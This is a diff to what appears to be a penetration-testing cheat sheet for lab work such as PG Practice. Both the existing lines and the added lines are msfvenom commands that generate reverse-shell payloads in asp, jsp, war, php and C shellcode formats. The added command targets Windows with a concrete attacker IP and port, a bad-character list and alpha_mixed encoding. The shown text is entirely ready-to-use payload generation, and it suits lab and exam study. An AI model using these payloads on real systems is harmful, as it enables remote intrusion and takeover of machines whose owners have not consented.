@@ -1526,6 +1526,10 @@ msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+# Between string is bad character, no need to mention - for LHOST and LPORT
+#reference is kevin PGPractice - https://www.youtube.com/watch?v=9h8BSFsL7wk
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
 ```
 
 ### One Liners
